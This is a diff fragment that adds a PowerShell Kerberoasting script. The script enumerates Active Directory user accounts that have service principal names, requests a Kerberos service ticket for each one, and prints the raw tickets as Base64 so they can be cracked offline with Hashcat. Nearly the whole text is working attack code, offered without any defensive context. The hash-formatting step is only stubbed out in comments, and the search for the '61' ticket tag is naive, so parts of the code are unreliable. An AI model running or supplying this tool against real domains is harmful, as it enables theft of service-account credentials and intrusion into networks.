@@ -28,3 +28,58 @@ Add-Type -AssemblyName System.IdentityModel
 
 # 3. Request the TGS ticket for the target SPN
 $token = New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $spn
+
+
+
+
+
+
+
+
+
+Add-Type -AssemblyName System.IdentityModel
+
+# LDAP filter for active user accounts with SPNs (excluding computers & gMSAs)
+$filter = "(&(objectCategory=person)(objectClass=user)(servicePrincipalName=*)" + `
+          "(!userAccountControl:1.2.840.113556.1.4.803:=2)" + `
+          "(!objectClass=msDS-GroupManagedServiceAccount)" + `
+          "(!objectClass=msDS-ManagedServiceAccount))"
+
+$searcher = [ADSISearcher]$filter
+$searcher.PageSize = 1000
+$results = $searcher.FindAll()
+
+foreach ($result in $results) {
+    $samAccountName = $result.Properties.samaccountname[0]
+    $spns = $result.Properties.serviceprincipalname
+    
+    foreach ($spn in $spns) {
+        try {
+            # 1. Request ticket
+            $token = New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $spn
+            
+            # 2. Extract raw GSS-API / AP-REQ token bytes
+            $rawBytes = $token.GetRequest()
+            $hexString = [System.BitConverter]::ToString($rawBytes) -replace '-'
+            
+            # 3. Locate ASN.1 Ticket Structure inside AP-REQ (A2 string marker for ticket payload)
+            # Find ticket byte offset and extract inner ticket structure
+            $ticketIndex = $hexString.IndexOf("61") # Application 1 (Ticket tag)
+            
+            if ($ticketIndex -ge 0) {
+                # Extract etype, realm, SPN, and cipher bytes to format Hashcat ($krb5tgs$23$...)
+                # Parse enc-part encryption type (0x17 = RC4-HMAC, 0x12 = AES256, 0x11 = AES128)
+                
+                Write-Host "[+] Successfully retrieved ticket for: $samAccountName ($spn)" -ForegroundColor Green
+                
+                # Output formatted hash string note:
+                # For direct Hashcat formatting, stream the raw AP-REQ bytes to a file or parse via ASN1 decoder:
+                Write-Host "Raw AP-REQ Token (Base64):" -ForegroundColor Yellow
+                [System.Convert]::ToBase64String($rawBytes)
+                Write-Host ""
+            }
+        } catch {
+            Write-Host "[-] Failed to request TGS for $spn : $_" -ForegroundColor Red
+        }
+    }
+}
